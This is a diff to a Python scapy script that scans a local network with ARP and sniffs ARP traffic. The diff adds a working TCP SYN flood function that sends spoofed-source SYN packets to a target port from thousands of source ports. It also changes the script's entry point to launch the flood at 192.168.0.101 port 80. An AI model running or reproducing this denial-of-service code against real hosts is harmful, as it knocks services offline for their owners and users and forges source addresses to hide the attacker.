@@ -1,11 +1,13 @@
+# -*- coding:utf-8 -*-
 from scapy.all import *
 import socket
 import json
+import random
 #scan active host
 def active_host(ip_section):
     host_list = my_arping(ip_section)
-    ip_list = [x[0] for x in host_list]
-    mac_list = [x[1] for x in host_list]
+    #ip_list = [x[0] for x in host_list]
+    #mac_list = [x[1] for x in host_list]
     #print ip_list
     #print '*'*10
     #print mac_list
@@ -21,8 +23,8 @@ def my_arping(net, timeout=2, cache=0, verbose=None, **kargs):
     Set cache=True if you want arping to modify internal ARP-Cache"""
     if verbose is None:
         verbose = conf.verb
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net), verbose=verbose,
-                     filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net), verbose=verbose,filter="arp and arp[7] = 2",
+                     timeout=timeout, iface_hint=net, **kargs)
     for s, r in ans.res:
         ip = r.sprintf("%ARP.psrc%")
         mac = r.sprintf("%Ether.src%")
@@ -48,14 +50,20 @@ def load_rules(filename):
     #print input[0]['ip']
     return rules
 
-def tcp_syn_flood(ip):
-    pass
+def tcp_syn_flood(ip,dPort):
+    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
+    for sPort in range(1024, 65535):
+        index = random.randrange(4)
+        ipLayer = IP(src=srcList[index], dst=ip)
+        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
+        packet = ipLayer / tcpLayer
+        send(packet)
 
 def packet(packet):
     print packet.show()
     print packet[ARP].psrc + '  ' + packet[ARP].pdst
 
-def start_sniff(packet_callback,IPSECTION):
+def start_sniff_arp(packet_callback,IPSECTION):
 
     sniff(filter= "arp and net {0}".format(IPSECTION), prn = packet_callback,count=0,store=0)
 
@@ -78,4 +86,4 @@ if __name__ == "__main__":
     #print ans2
     #print ans3
     #start_sniff(packet)
-    print 'aa'
+    tcp_syn_flood('192.168.0.101',80)
